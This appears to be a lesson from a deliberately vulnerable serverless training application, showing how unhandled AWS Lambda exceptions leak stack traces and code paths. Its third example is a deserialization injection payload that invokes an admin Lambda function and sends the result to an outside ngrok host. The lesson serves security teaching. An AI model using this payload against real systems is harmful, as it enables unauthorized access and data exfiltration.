# LESSON 10: Unhandled Exceptions

The Lambda that handles the request is a "dumb" function when talking about response message. The function returns back any message that was received from the invoked function. In some cases, sending partial or incorrect data could reveal code or sensitive information if an error is sent back to to the function.

### Example 1
```{"action": "get"}```

We will receive an error that reveals code from the invoked function:
```
{
  "stackTrace": [
    [
      "/var/task/lambda_function.py",
      29,
      "lambda_handler",
      "orderId = event[\"orderId\"]"
    ]
  ],
  "errorType": "KeyError",
  "errorMessage": "'orderId'"
}
```

### Example 2

```
{"action":"shipping","order-id":"61f6269a-aafd-406d-8dca-84873b6ccef5","data":{"name":"asdasda","address":"sdasdasd","email":"","phone":"123123123"}}
```

Will result in:
```
{
   "stackTrace":[
      [
         "/var/task/lambda_function.py",
         47,
         "lambda_handler",
         "':address': address"
      ],
      [
         "/var/runtime/boto3/resources/factory.py",
         520,
         "do_action",
         "response = action(self, *args, **kwargs)"
      ],
      [
         "/var/runtime/boto3/resources/action.py",
         83,
         "__call__",
         "response = getattr(parent.meta.client, operation_name)(**params)"
      ],
      [
         "/var/runtime/botocore/client.py",
         314,
         "_api_call",
         "return self._make_api_call(operation_name, kwargs)"
      ],
      [
         "/var/runtime/botocore/client.py",
         612,
         "_make_api_call",
         "raise error_class(parsed_response, operation_name)"
      ]
   ],
   "errorType":"ClientError",
   "errorMessage":"An error occurred (ValidationException) when calling the UpdateItem operation: ExpressionAttributeValues contains invalid value: One or more parameter values were invalid: An AttributeValue may not contain an empty string for key :address"
}
```

### Example 3

```
{"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ADMIN-GET-RECEIPT\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"year\": \"2019\", \"month\": \"12\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"http://fd79e219.ngrok.io/lol?data=\"+JSON.stringify(d));}); }()"}
```
Will result in:
```
{
  "StatusCode": 200,
  "FunctionError": "Unhandled",
  "ExecutedVersion": "$LATEST",
  "Payload": "{\"stackTrace\": [[\"/var/task/backend/src/functions/admin/admin-get-receipts.py\", 33, \"lambda_handler\", \"download_dir(client, resource, prefix, '/tmp', bucket)\"], [\"/var/task/backend/src/functions/admin/admin-get-receipts.py\", 8, \"download_dir\", \"for result in paginator.paginate(Bucket=bucket, Delimiter='/', Prefix=dist):\"], [\"/var/runtime/botocore/paginate.py\", 255, \"__iter__\", \"response = self._make_request(current_kwargs)\"], [\"/var/runtime/botocore/paginate.py\", 332, \"_make_request\", \"return self._method(**current_kwargs)\"], [\"/var/runtime/botocore/client.py\", 314, \"_api_call\", \"return self._make_api_call(operation_name, kwargs)\"], [\"/var/runtime/botocore/client.py\", 612, \"_make_api_call\", \"raise error_class(parsed_response, operation_name)\"]], \"errorType\": \"ClientError\", \"errorMessage\": \"An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied\"}"
}
```

- - -
[ToC](../LESSONS/README.md) | [1](../LESSONS/LESSON_01.md) | [2](../LESSONS/LESSON_02.md) | [3](../LESSONS/LESSON_03.md) | [4](../LESSONS/LESSON_04.md) | [5](../LESSONS/LESSON_05.md) | [6](../LESSONS/LESSON_06.md) | [7](../LESSONS/LESSON_07.md) | [8](../LESSONS/LESSON_08.md) | [9](../LESSONS/LESSON_09.md) | [10](../LESSONS/LESSON_10.md)
